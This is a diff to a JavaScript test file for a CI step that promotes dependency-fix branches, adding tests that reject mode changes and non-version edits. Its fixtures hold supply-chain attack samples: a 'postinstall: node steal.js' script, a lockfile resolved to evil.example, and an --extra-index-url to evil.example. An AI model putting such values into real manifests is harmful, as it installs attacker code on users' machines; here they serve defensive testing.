@@ -160,9 +160,21 @@ const CLASSIFY = new URL("./dependency-classify.mjs", import.meta.url);
 // hands them on: a fixture, not this repository's config.
 const PAIRS = [["github-actions", "/"], ["npm", "/"], ["npm", "/plugins/miro/server"], ["npm", "/.github/actions/resolve-config"], ["pip", "/plugins/animation"], ["pip", "/.github"]];
 
+// A plain version bump of x, and of numpy, on each side of the fix.
+const pkg = (range, extra = {}) => JSON.stringify({ name: "p", scripts: { test: "node t.js" }, dependencies: { x: range }, ...extra });
+const lock = (version, resolved = `https://registry.npmjs.org/x/-/x-${version}.tgz`) =>
+  JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/x": { version, resolved } } });
+const reqs = (version) => `numpy==${version}\n`;
+const BEFORE = { "package.json": pkg("^1.0.0"), "package-lock.json": lock("1.0.0"), "requirements.txt": reqs("2.5.3"), "requirements.in": reqs("2.5.3") };
+const AFTER = { "package.json": pkg("^2.0.0"), "package-lock.json": lock("2.0.0"), "requirements.txt": reqs("2.5.4"), "requirements.in": reqs("2.5.4") };
+const nameOf = (path) => path.slice(path.lastIndexOf("/") + 1);
+const modified = (filename) => ({ filename, status: "modified" });
+
 // The dependency-review path of the same step, on a `fix` verdict whose
-// commits all carry [dependabot skip].
-async function promoteFix(files, { classify = readFileSync(CLASSIFY), sha256, pairs = JSON.stringify(PAIRS) } = {}) {
+// commits all carry [dependabot skip]. Every lane-tip entry is a regular file
+// unless `modes` names it; `texts` maps `${ref}:${path}` to a file's text,
+// else BEFORE at the head and AFTER at the lane tip.
+async function promoteFix(files, { classify = readFileSync(CLASSIFY), sha256, pairs = JSON.stringify(PAIRS), modes = {}, texts = {} } = {}) {
   const classifyScript = join(dir, "dependency-classify.mjs");
   writeFileSync(classifyScript, classify);
   const saved = { ...process.env };
@@ -184,8 +196,25 @@ async function promoteFix(files, { classify = readFileSync(CLASSIFY), sha256, pa
   const commits = [{ commit: { message: "Fix the dependency update on x [dependabot skip]" } }];
   const github = {
     request: async () => ({ data: { object: { sha: LANE } } }),
+    async graphql(query, { expression }) {
+      const at = expression.slice(`${LANE}:`.length);
+      const entries = files
+        .map((f) => f.filename)
+        .filter((name) => name.slice(0, Math.max(name.lastIndexOf("/"), 0)) === at)
+        .map((name) => ({ name: nameOf(name), ...(modes[name] ?? { type: "blob", mode: 0o100644 }) }));
+      return { repository: { object: { entries } } };
+    },
     rest: {
-      repos: { compareCommitsWithBasehead: async () => ({ data: { files, commits } }) },
+      repos: {
+        compareCommitsWithBasehead: async () => ({ data: { files, commits } }),
+        async getContent({ path, ref, mediaType }) {
+          assert.equal(mediaType?.format, "raw");
+          const key = `${ref}:${path}`;
+          const text = key in texts ? texts[key] : (ref === HEAD ? BEFORE : AFTER)[nameOf(path)];
+          if (text === undefined) throw Object.assign(new Error("Not Found"), { status: 404 });
+          return { data: text };
+        },
+      },
       git: { deleteRef: async () => {} },
     },
   };
@@ -207,9 +236,9 @@ const OUT_OF_FIX_SCOPE = /^The lane branch changes a path that is not an npm or 
 
 test("a dependency fix touching only manifests and lock files reaches the move", async () => {
   for (const files of [
-    [{ filename: "package.json" }, { filename: "package-lock.json" }],
-    [{ filename: "plugins/miro/server/package.json" }, { filename: "plugins/miro/server/package-lock.json" }],
-    [{ filename: "plugins/animation/requirements.in" }, { filename: "plugins/animation/requirements.txt" }],
+    [modified("package.json"), modified("package-lock.json")],
+    [modified("plugins/miro/server/package.json"), modified("plugins/miro/server/package-lock.json")],
+    [modified("plugins/animation/requirements.in"), modified("plugins/animation/requirements.txt")],
   ]) {
     const failed = await promoteFix(files);
     assert.equal(failed.length, 1, JSON.stringify(files));
@@ -248,6 +277,31 @@ test("a rewritten classifier copy, or no recorded hash, stops a dependency fix",
   for (const options of [{ classify: permissive }, { sha256: "" }]) {
     const failed = await promoteFix([{ filename: "src/x.js" }], options);
     assert.deepEqual(failed, ["dependency-classify.mjs does not match the base's copy; the PR branch is not moved"]);
+  }
+});
+
+const NOT_A_VERSION_CHANGE = /^The lane branch's fix is not a version change of regular manifest files \(/;
+
+test("a dependency fix that makes package.json a symbolic link, submodule or executable does not move the PR branch", async () => {
+  for (const entry of [{ type: "blob", mode: 0o120000 }, { type: "commit", mode: 0o160000 }, { type: "blob", mode: 0o100755 }]) {
+    const failed = await promoteFix([modified("package.json")], { modes: { "package.json": entry } });
+    assert.equal(failed.length, 1, JSON.stringify(entry));
+    assert.match(failed[0], NOT_A_VERSION_CHANGE, JSON.stringify(entry));
+    assert.match(failed[0], /fix-mode:package\.json/);
+  }
+});
+
+test("a dependency fix whose content is more than a version change does not move the PR branch", async () => {
+  const cases = {
+    "a postinstall script": [modified("package.json"), { [`${LANE}:package.json`]: pkg("^2.0.0", { scripts: { test: "node t.js", postinstall: "node steal.js" } }) }],
+    "a lock resolved to another host": [modified("package-lock.json"), { [`${LANE}:package-lock.json`]: lock("2.0.0", "https://evil.example/x.tgz") }],
+    "an --extra-index-url line": [modified("plugins/animation/requirements.txt"), { [`${LANE}:plugins/animation/requirements.txt`]: `--extra-index-url https://evil.example/simple\n${reqs("2.5.4")}` }],
+    "an added file": [{ filename: "package-lock.json", status: "added" }, {}],
+  };
+  for (const [why, [file, texts]] of Object.entries(cases)) {
+    const failed = await promoteFix([file], { texts });
+    assert.equal(failed.length, 1, why);
+    assert.match(failed[0], NOT_A_VERSION_CHANGE, why);
   }
 });
 
